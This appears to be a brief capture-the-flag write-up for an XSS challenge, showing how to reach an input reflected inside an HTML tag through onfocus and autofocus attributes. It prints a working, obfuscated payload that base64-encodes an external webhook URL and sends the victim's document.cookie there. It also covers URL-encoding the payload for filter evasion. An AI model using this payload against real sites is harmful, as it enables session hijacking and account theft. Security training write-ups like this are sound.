![image](https://github.com/user-attachments/assets/589582d3-7432-40a1-8e68-9829e44f23ed)
<br>Hint 1: Can you run javascript in HTML attributes?

# Exploration
two key things needed to be noted from this challenge.
1. Same as XSS-GPT v2, filter evasion still exist here.
![image](https://github.com/user-attachments/assets/ad146703-e5be-47d5-a74f-d6c07559df61)
2. Payload reflected area has also changed. Prev was direct javascript, now is under HTML tags.
![image](https://github.com/user-attachments/assets/02eda188-3fc6-40d9-9f23-a797a720153b)

the tip here is to use other HTML attributes to trigger javascript code.

# Solution
The payload should look something like this.
<br>```hii onfocus=eval("location.href=(atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvNjQ2NzkwMTEtN2EyNS00NmIzLThlYTEtMGE4NmM2NTQyYTMzP2M9'))+document.cookie") autofocus=```
<br>```hii``` is used to fill in the value parameter.
<br>```onfocus``` is used to run javascript code that use to return admin cookies.
<br>```autofocus``` is used to trigger the onfocus attribute, if not it won't run.
<br>Visit this site to learn more: https://security.stackexchange.com/questions/97550/how-to-launch-xss-code-from-an-input-html-tag-upon-page-load

Same thing as XSS-GPT v2, make sure turn URL into base64 and turn whole payload into URL Encoded.
![image](https://github.com/user-attachments/assets/b6c518b2-c5f6-45b9-af68-1573cde17bd2)
![image](https://github.com/user-attachments/assets/cb032062-6ffb-4d1d-8943-a20c56ef47c8)
![final1](https://github.com/user-attachments/assets/1a6a4431-a806-4a69-a4d9-4a00968b0fa2)
